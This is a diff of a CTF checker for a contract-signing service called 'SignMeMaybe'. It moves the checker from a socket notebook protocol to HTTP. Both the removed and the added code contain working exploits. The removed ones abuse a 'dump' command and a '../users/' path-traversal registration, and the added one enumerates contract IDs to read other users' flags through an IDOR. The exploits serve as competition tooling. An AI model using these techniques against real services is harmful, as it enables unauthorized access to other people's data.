@@ -1,28 +1,25 @@
-from asyncio import StreamReader, StreamWriter
+from __future__ import annotations
+
 import asyncio
+import json
+import os
 import random
+import re
 import string
-import faker
-
-
-from typing import Optional
 from logging import LoggerAdapter
+from typing import Any, Iterable, Optional
+from urllib import error, request
 
 from enochecker3 import (
     ChainDB,
     Enochecker,
     ExploitCheckerTaskMessage,
     FlagSearcher,
-    PutflagCheckerTaskMessage,
     GetflagCheckerTaskMessage,
-    PutnoiseCheckerTaskMessage,
-    GetnoiseCheckerTaskMessage,
     HavocCheckerTaskMessage,
     MumbleException,
     OfflineException,
-    InternalErrorException,
     PutflagCheckerTaskMessage,
-    AsyncSocket,
 )
 from enochecker3.utils import assert_equals, assert_in
 
@@ -31,6 +28,9 @@ Checker config
 """
 
 SERVICE_PORT = 1984
+HTTP_TIMEOUT_SECONDS = float(os.getenv("SIGNMEMAYBE_CHECKER_TIMEOUT", "5"))
+MAX_CONTRACT_ID = int(os.getenv("SIGNMEMAYBE_MAX_CONTRACT_ID", "250"))
+
 checker = Enochecker("SignMeMaybe", SERVICE_PORT)
 app = lambda: checker.app
 
@@ -39,347 +39,384 @@ app = lambda: checker.app
 Utility functions
 """
 
-class Connection:
-    def __init__(self, socket: AsyncSocket, logger: LoggerAdapter):
-        self.reader, self.writer = socket[0], socket[1]
+JsonObject = dict[str, Any]
+
+
+def random_suffix(length: int = 16) -> str:
+    alphabet = string.ascii_lowercase + string.digits
+    return "".join(random.choice(alphabet) for _ in range(length))
+
+
+def service_base_url(task: Any) -> str:
+    address = getattr(task, "address", None) or getattr(task, "host", None)
+    if not isinstance(address, str) or not address:
+        raise MumbleException("Checker task did not contain a target address")
+    return f"http://{address}:{SERVICE_PORT}"
+
+
+def require_json_object(value: Any, context: str) -> JsonObject:
+    if not isinstance(value, dict):
+        raise MumbleException(f"{context} did not return a JSON object")
+    return value
+
+
+class HttpClient:
+    def __init__(self, base_url: str, logger: LoggerAdapter):
+        self.base_url = base_url.rstrip("/")
         self.logger = logger
 
-    async def register_user(self, username: str, password: str):
-        self.logger.debug(
-            f"Sending command to register user: {username} with password: {password}"
+    async def request_json(
+        self,
+        method: str,
+        path: str,
+        body: JsonObject | None = None,
+        token: str | None = None,
+    ) -> tuple[int, Any]:
+        return await asyncio.to_thread(self._request_json_sync, method, path, body, token)
+
+    def _request_json_sync(
+        self,
+        method: str,
+        path: str,
+        body: JsonObject | None,
+        token: str | None,
+    ) -> tuple[int, Any]:
+        url = self.base_url + path
+        data: bytes | None = None
+        headers: dict[str, str] = {"Accept": "application/json"}
+
+        if body is not None:
+            data = json.dumps(body).encode("utf-8")
+            headers["Content-Type"] = "application/json"
+
+        if token is not None:
+            headers["X-Session-Token"] = token
+
+        req = request.Request(url, data=data, headers=headers, method=method)
+        self.logger.debug("Sending %s %s", method, path)
+
+        try:
+            with request.urlopen(req, timeout=HTTP_TIMEOUT_SECONDS) as resp:
+                return resp.status, self._decode_response(resp.read())
+        except error.HTTPError as exc:
+            return exc.code, self._decode_response(exc.read())
+        except (error.URLError, TimeoutError, ConnectionError, OSError) as exc:
+            self.logger.debug("Connection to service failed: %r", exc)
+            raise OfflineException("Could not connect to service") from exc
+
+    @staticmethod
+    def _decode_response(raw: bytes) -> Any:
+        if not raw:
+            return None
+
+        text = raw.decode("utf-8", errors="replace")
+        try:
+            return json.loads(text)
+        except json.JSONDecodeError as exc:
+            raise MumbleException("Service returned invalid JSON") from exc
+
+    async def register_user(self, username: str, password: str) -> tuple[int, str, str]:
+        status, data = await self.request_json(
+            "POST",
+            "/api/register",
+            {
+                "username": username,
+                "password": password,
+            },
         )
-        self.writer.write(f"reg {username} {password}\n".encode())
-        await self.writer.drain()
-        data = await self.reader.readuntil(b">")
-        if not b"User successfully registered" in data:
-            raise MumbleException("Failed to register user")
 
-    async def login_user(self, username: str, password: str):
-        self.logger.debug(f"Sending command to login.")
-        self.writer.write(f"log {username} {password}\n".encode())
-        await self.writer.drain()
+        if status != 200:
+            raise MumbleException(f"Failed to register user: HTTP {status}")
 
-        data = await self.reader.readuntil(b">")
-        if not b"Successfully logged in!" in data:
-            raise MumbleException("Failed to log in!")
+        data_obj = require_json_object(data, "register response")
+        user_id = data_obj.get("userId")
+        token = data_obj.get("token")
+
+        if not isinstance(user_id, int) or user_id <= 0:
+            raise MumbleException("Register response did not contain a valid userId")
+        if not isinstance(token, str) or not token:
+            raise MumbleException("Register response did not contain a valid token")
+
+        return user_id, username, token
+
+    async def login_user(self, username: str, password: str) -> tuple[int, str, str]:
+        status, data = await self.request_json(
+            "POST",
+            "/api/login",
+            {
+                "username": username,
+                "password": password,
+            },
+        )
+
+        if status != 200:
+            raise MumbleException(f"Failed to login user: HTTP {status}")
+
+        data_obj = require_json_object(data, "login response")
+        user_id = data_obj.get("userId")
+        token = data_obj.get("token")
+
+        if not isinstance(user_id, int) or user_id <= 0:
+            raise MumbleException("Login response did not contain a valid userId")
+        if not isinstance(token, str) or not token:
+            raise MumbleException("Login response did not contain a valid token")
+
+        return user_id, username, token
+
+    async def create_contract(self, token: str, title: str, content: str) -> int:
+        status, data = await self.request_json(
+            "POST",
+            "/api/contracts",
+            {
+                "title": title,
+                "content": content,
+            },
+            token=token,
+        )
+
+        if status not in (200, 201):
+            raise MumbleException(f"Failed to create contract: HTTP {status}")
+
+        data_obj = require_json_object(data, "contract creation response")
+        contract_id = data_obj.get("contractId")
+
+        if not isinstance(contract_id, int) or contract_id <= 0:
+            raise MumbleException("Contract creation response did not contain a valid contractId")
+
+        return contract_id
+
+    async def list_contracts(self, token: str) -> list[JsonObject]:
+        status, data = await self.request_json("GET", "/api/contracts", token=token)
+
+        if status != 200:
+            raise MumbleException(f"Failed to list contracts: HTTP {status}")
+
+        data_obj = require_json_object(data, "contract list response")
+        contracts = data_obj.get("contracts")
+
+        if not isinstance(contracts, list):
+            raise MumbleException("Contract list response did not contain a contracts list")
+
+        return [contract for contract in contracts if isinstance(contract, dict)]
+
+    async def latest_contract_version(self, token: str, contract_id: int) -> tuple[int, Any]:
+        return await self.request_json(
+            "GET",
+            f"/api/contracts/{contract_id}/versions/latest",
+            token=token,
+        )
 
 
-@checker.register_dependency
-def _get_connection(socket: AsyncSocket, logger: LoggerAdapter) -> Connection:
-    return Connection(socket, logger)
+def make_client(task: Any, logger: LoggerAdapter) -> HttpClient:
+    return HttpClient(service_base_url(task), logger)
+
+
+def get_string_field(data: JsonObject, key: str, context: str) -> str:
+    value = data.get(key)
+    if not isinstance(value, str):
+        raise MumbleException(f"{context} did not contain a valid {key}")
+    return value
+
+
+def extract_contract_ids_from_hints(task: ExploitCheckerTaskMessage) -> list[int]:
+    possible_hints = [
+        getattr(task, "attack_info", None),
+        getattr(task, "flag_ids", None),
+        getattr(task, "flag_id", None),
+    ]
+
+    found: list[int] = []
+    for hint in possible_hints:
+        found.extend(_extract_contract_ids(hint))
+
+    seen: set[int] = set()
+    unique_ids: list[int] = []
+    for contract_id in found:
+        if contract_id > 0 and contract_id not in seen:
+            seen.add(contract_id)
+            unique_ids.append(contract_id)
+
+    return unique_ids
+
+
+def _extract_contract_ids(value: Any) -> list[int]:
+    if value is None:
+        return []
+
+    if isinstance(value, int):
+        return [value]
+
+    if isinstance(value, str):
+        return [int(match) for match in re.findall(r"\d+", value)]
+
+    if isinstance(value, dict):
+        result: list[int] = []
+        for key in ("contractId", "contract_id", "id", "hint"):
+            if key in value:
+                result.extend(_extract_contract_ids(value[key]))
+        if not result:
+            for nested in value.values():
+                result.extend(_extract_contract_ids(nested))
+        return result
+
+    if isinstance(value, Iterable):
+        result: list[int] = []
+        for nested in value:
+            result.extend(_extract_contract_ids(nested))
+        return result
+
+    return []
 
 
 """
 CHECKER FUNCTIONS
 """
 
+
 @checker.putflag(0)
-async def putflag_note(
+async def putflag_contract(
     task: PutflagCheckerTaskMessage,
     db: ChainDB,
-    conn: Connection,
-    logger: LoggerAdapter,    
-) -> None:
-    # First we need to register a user. So let's create some random strings. (Your real checker should use some funny usernames or so)
-    username: str = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
+    logger: LoggerAdapter,
+) -> int:
+    client = make_client(task, logger)
+
+    username = "checker_" + random_suffix(16)
+    password = "checkerpass_" + random_suffix(16)
+    title = "Signing Package " + random_suffix(12)
+
+    logger.debug("Registering flag owner")
+    _user_id, _username, token = await client.register_user(username, password)
+
+    logger.debug("Creating contract that contains the flag")
+    contract_id = await client.create_contract(token, title, task.flag)
+
+    logger.debug("Checking that the new contract is present in the owner's list")
+    contracts = await client.list_contracts(token)
+    listed_ids = [contract.get("contractId") for contract in contracts]
+    assert_in(contract_id, listed_ids, "Created contract was not visible in the owner's list")
+
+    await db.set(
+        "contract",
+        {
+            "username": username,
+            "password": password,
+            "title": title,
+            "contract_id": contract_id,
+        },
     )
-    password: str = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
 
-    # Log a message before any critical action that could raise an error.
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
+    # I return the contract id as attack hint so exploits do not have to scan the whole service.
+    return contract_id
 
-    # Register a new user
-    await conn.register_user(username, password)
-
-    # Now we need to login
-    await conn.login_user(username, password)
-
-    # Finally, we can post our note!
-    logger.debug(f"Sending command to set the flag")
-    conn.writer.write(f"set {task.flag}\n".encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b"Note saved! ID is ")
-
-    try:
-        # Try to retrieve the resulting noteId. Using rstrip() is hacky, you should probably want to use regular expressions or something more robust.
-        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
-    except Exception as ex:
-        logger.debug(f"Failed to retrieve note: {ex}")
-        raise MumbleException("Could not retrieve NoteId")
-
-    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
-
-    logger.debug(f"Got noteId {noteId}")
-
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
-    
-    # Save the generated values for the associated getflag() call.
-    await db.set("userdata", (username, password, noteId))
-
-    return username
 
 @checker.getflag(0)
-async def getflag_note(
-    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
+async def getflag_contract(
+    task: GetflagCheckerTaskMessage,
+    db: ChainDB,
+    logger: LoggerAdapter,
 ) -> None:
-    try:
-        username, password, noteId = await db.get("userdata")
-    except KeyError:
-        raise MumbleException("Missing database entry from putflag")
-
-    logger.debug(f"Connecting to the service")
-    await conn.reader.readuntil(b">")
-
-    # Let's login to the service
-    await conn.login_user(username, password)
-
-    # Let´s obtain our note.
-    logger.debug(f"Sending command to retrieve note: {noteId}")
-    conn.writer.write(f"get {noteId}\n".encode())
-    await conn.writer.drain()
-    note = await conn.reader.readuntil(b">")
-    assert_in(
-        task.flag.encode(), note, "Resulting flag was found to be incorrect"
-    )
-
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
-        
-
-@checker.putnoise(0)
-async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to the service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
-    username = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    password = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    randomNote = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=36)
-    )
-
-    # Register another user
-    await conn.register_user(username, password)
-
-    # Now we need to login
-    await conn.login_user(username, password)
-
-    # Finally, we can post our note!
-    logger.debug(f"Sending command to save a note")
-    conn.writer.write(f"set {randomNote}\n".encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b"Note saved! ID is ")
+    client = make_client(task, logger)
 
     try:
-        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
-    except Exception as ex:
-        logger.debug(f"Failed to retrieve note: {ex}")
-        raise MumbleException("Could not retrieve NoteId")
+        stored = await db.get("contract")
+        username = stored["username"]
+        password = stored["password"]
+        contract_id = int(stored["contract_id"])
+    except (KeyError, TypeError, ValueError) as exc:
+        raise MumbleException("Missing or broken database entry from putflag") from exc
 
-    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
+    logger.debug("Logging in as the flag owner")
+    _user_id, _username, token = await client.login_user(username, password)
 
-    logger.debug(f"{noteId}")
+    logger.debug("Retrieving own latest contract version")
+    status, data = await client.latest_contract_version(token, contract_id)
 
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
+    if status != 200:
+        raise MumbleException(f"Could not retrieve stored contract: HTTP {status}")
 
-    await db.set("userdata", (username, password, noteId, randomNote))
-        
-@checker.getnoise(0)
-async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
-    try:
-        (username, password, noteId, randomNote) = await db.get('userdata')
-    except:
-        raise MumbleException("Putnoise Failed!") 
-
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # Let's login to the service
-    await conn.login_user(username, password)
-
-    # Let´s obtain our note.
-    logger.debug(f"Sending command to retrieve note: {noteId}")
-    conn.writer.write(f"get {noteId}\n".encode())
-    await conn.writer.drain()
-    data = await conn.reader.readuntil(b">")
-    if not randomNote.encode() in data:
-        raise MumbleException("Resulting flag was found to be incorrect")
-
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
+    data_obj = require_json_object(data, "latest contract response")
+    content = get_string_field(data_obj, "content", "latest contract response")
+    assert_equals(content, task.flag, "Stored flag content was incorrect")
 
 
 @checker.havoc(0)
-async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
+async def havoc_health(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
+    client = make_client(task, logger)
 
-    # In variant 0, we'll check if the help text is available
-    logger.debug(f"Sending help command")
-    conn.writer.write(f"help\n".encode())
-    await conn.writer.drain()
-    helpstr = await conn.reader.readuntil(b">")
+    logger.debug("Checking health endpoint")
+    status, data = await client.request_json("GET", "/health")
 
-    for line in [
-        "This is a notebook service. Commands:",
-        "reg USER PW - Register new account",
-        "log USER PW - Login to account",
-        "set TEXT..... - Set a note",
-        "user  - List all users",
-        "list - List all notes",
-        "exit - Exit!",
-        "dump - Dump the database",
-        "get ID",
-    ]:
-        assert_in(line.encode(), helpstr, "Received incomplete response.")
+    if status != 200:
+        raise MumbleException(f"Health endpoint returned HTTP {status}")
+
+    data_obj = require_json_object(data, "health response")
+    assert_equals(data_obj.get("status"), "ok", "Health endpoint did not report ok")
+
 
 @checker.havoc(1)
-async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
+async def havoc_contract_flow(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
+    client = make_client(task, logger)
 
-    # In variant 1, we'll check if the `user` command still works.
-    username = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    password = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
+    username = "havoc_" + random_suffix(16)
+    password = "havocpass_" + random_suffix(16)
+    title = "Havoc Contract " + random_suffix(12)
+    content = "contract text " + random_suffix(32)
 
-    # Register and login a dummy user
-    await conn.register_user(username, password)
-    await conn.login_user(username, password)
+    logger.debug("Registering a havoc user")
+    _user_id, _username, token = await client.register_user(username, password)
 
-    logger.debug(f"Sending user command")
-    conn.writer.write(f"user\n".encode())
-    await conn.writer.drain()
-    ret = await conn.reader.readuntil(b">")
-    if not b"User 0: " in ret:
-        raise MumbleException("User command does not return any users")
+    logger.debug("Creating a havoc contract")
+    contract_id = await client.create_contract(token, title, content)
 
-    if username:
-        assert_in(username.encode(), ret, "Flag username not in user output")
+    logger.debug("Retrieving the havoc contract")
+    status, data = await client.latest_contract_version(token, contract_id)
 
-    # conn.writer.close()
-    # await conn.writer.wait_closed()
+    if status != 200:
+        raise MumbleException(f"Could not retrieve havoc contract: HTTP {status}")
 
-@checker.havoc(2)
-async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
+    data_obj = require_json_object(data, "havoc latest contract response")
+    assert_equals(data_obj.get("contractId"), contract_id, "Wrong contract id returned")
+    assert_equals(data_obj.get("title"), title, "Wrong contract title returned")
+    assert_equals(data_obj.get("content"), content, "Wrong contract content returned")
 
-    # In variant 2, we'll check if the `list` command still works.
-    username = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    password = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    randomNote = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=36)
-    )
-
-    # Register and login a dummy user
-    await conn.register_user(username, password)
-    await conn.login_user(username, password)
-
-    logger.debug(f"Sending command to save a note")
-    conn.writer.write(f"set {randomNote}\n".encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b"Note saved! ID is ")
-
-    try:
-        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
-    except Exception as ex:
-        logger.debug(f"Failed to retrieve note: {ex}")
-        raise MumbleException("Could not retrieve NoteId")
-
-    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
-
-    logger.debug(f"{noteId}")
-
-    logger.debug(f"Sending list command")
-    conn.writer.write(f"list\n".encode())
-    await conn.writer.drain()
-
-    data = await conn.reader.readuntil(b">")
-    if not noteId.encode() in data:
-        raise MumbleException("List command does not work as intended")
 
 @checker.exploit(0)
-async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"dump\nexit\n")
-    await conn.writer.drain()
-    data = await conn.reader.read(-1)
-    if flag := searcher.search_flag(data):
-        return flag
-    raise MumbleException("flag not found")
+async def exploit_idor(
+    task: ExploitCheckerTaskMessage,
+    searcher: FlagSearcher,
+    logger: LoggerAdapter,
+) -> Optional[str]:
+    client = make_client(task, logger)
 
-@checker.exploit(1)
-async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"user\n")
-    await conn.writer.drain()
+    username = "attacker_" + random_suffix(16)
+    password = "attackpass_" + random_suffix(16)
 
-    # TODO: Use flag hints
-    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-    for user in user_list:
-        user_name = user.split()[-1]
-        conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
-        await conn.writer.drain()
-        await conn.reader.readuntil(b">")  # successfully registered
-        await conn.reader.readuntil(b">")  # successfully logged in
-        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-        for note in notes_list:
-            note_id = note.split()[-1]
-            conn.writer.write(b"get %s\n" % note_id)
-            await conn.writer.drain()
-            data = await conn.reader.readuntil(b">")
-            if flag := searcher.search_flag(data):
-                return flag
-    raise MumbleException("flag not found")
+    logger.debug("Registering attacker account")
+    _user_id, _username, token = await client.register_user(username, password)
 
-@checker.exploit(2)
-async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"user\n")
-    await conn.writer.drain()
+    contract_ids = extract_contract_ids_from_hints(task)
+    if not contract_ids:
+        contract_ids = list(range(1, MAX_CONTRACT_ID + 1))
 
-    # TODO: Use flag hints?
-    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-    for user in user_list:
-        user_name = user.split()[-1]
-        conn.writer.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
-        await conn.writer.drain()
-        await conn.reader.readuntil(b">")  # successfully registered
-        await conn.reader.readuntil(b">")  # successfully logged in
-        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-        for note in notes_list:
-            note_id = note.split()[-1]
-            conn.writer.write(b"get %s\n" % note_id)
-            await conn.writer.drain()
-            data = await conn.reader.readuntil(b">")
-            if flag := searcher.search_flag(data):
-                return flag
+    logger.debug("Trying %d contract ids via latest-version IDOR", len(contract_ids))
+    for contract_id in contract_ids:
+        status, data = await client.latest_contract_version(token, contract_id)
+
+        if status == 404:
+            continue
+        if status == 401:
+            raise MumbleException("Attacker session was rejected")
+        if status != 200:
+            logger.debug("Skipping contract %s because it returned HTTP %s", contract_id, status)
+            continue
+        if not isinstance(data, dict):
+            continue
+
+        raw = json.dumps(data, ensure_ascii=False).encode("utf-8", errors="replace")
+        if flag := searcher.search_flag(raw):
+            return flag
+
     raise MumbleException("flag not found")
 
 
